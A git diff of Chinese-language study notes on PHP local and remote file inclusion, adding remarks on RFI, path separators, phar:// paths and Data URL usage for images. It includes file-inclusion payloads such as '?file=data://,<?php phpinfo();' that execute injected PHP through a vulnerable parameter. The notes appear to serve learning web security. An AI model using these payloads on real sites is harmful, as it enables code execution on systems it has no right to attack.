@@ -23,6 +23,7 @@ include 和 require 语句是相同的，除了错误处理方面：
 ## 文件包含分类
  - 本地文件包含LFI(Local File Include)
  - 远程文件包含RFI(Remote File Include)
+   - 简单的说就是解析远程服务器的文件，但是存在限制
 
 ## 环境说明
  - `allow_url_fopen=On`(默认为`On`) 规定是否允许从远程服务器或者网站检索数据
@@ -117,6 +118,11 @@ phpinfo.txt文件会被当作PHP文件执行。
  - 压缩包路径必须是绝对路径
  - %23是因为get请求如果不把#进行url编码，#后面的参数会被忽略
 
+**正斜杆和反斜杆**
+ - Windows由于使用 斜杆/ 作为DOS命令提示符的参数标志了，为了不混淆，所以采用 反斜杠\ 作为路径分隔符。
+ - Unix使用斜杆/ 作为路径分隔符，而web应用最新使用在Unix系统上面，所以目前所有的网络地址都采用 斜杆/ 作为分隔符。
+ - 所以尽量用正斜杆去做，当然我在window+phpstudy中，使用反斜杆也是没有问题(Linux待测试)
+
 相同的类型的还有zlib://和bzip2://
 
 **问题遗留和记录**
@@ -139,7 +145,7 @@ phar://有点类似zip://同样可以导致 `任意代码执行`。
 **实例**
 ```
 ?file=phar://zip.jpg/phpinfo.txt
-?file=phar://D:\zip.jpg/phpinfo.txt
+?file=phar://D:\zip.jpg\phpinfo.txt
 
 phpinfo.txt文件会被当作PHP文件执行。
 ```
@@ -159,6 +165,9 @@ data:// 同样类似与php://input，可以让用户来控制输入流，当它�
 
 **实例**
 ```
+data://[<MIME-type>][;charset=<encoding>][;base64],<data>
+
+?file=data://,<?php phpinfo();
 ?file=data://text/plain,<?php phpinfo();
 ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
 ?file=data:text/plain,<?php phpinfo();
@@ -166,6 +175,20 @@ data:// 同样类似与php://input，可以让用户来控制输入流，当它�
 
 以上用法，代码都会被执行
 ```
+
+**注意：**
+很多时候会利用Data URL来进入存储图片，当使用`<img src='images/1.gif' />`会发送一个HTTP请求，但是使用`<img src="data:image/gif;base64,R0lGODlhMwAxAIAAAAAAA...==`的时候，图片被作为BASE64字符格式嵌入到页面中，便可以减少HTTP请求。但是编码后字符串体积也会增加，并且利用Data URL的图片浏览器不会去缓存。
+以至于一种解决方案，就是用CSS的URL操作符来指定网页元素的背景图片存入CSS中，浏览器不会缓存Data URL图片，但是会去缓存CSS文件。
+```css
+.striped_box
+  {
+  background-image: url("data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7");
+  }
+```
+当然其中利弊与不同点还有很多，更具体可以看
+[Data URL和图片](http://www.webhek.com/post/data-url.html)
+[Data URI 应用场景小结](https://www.cnblogs.com/zichi/p/5058941.html)
+
 <br>
 <br>
 
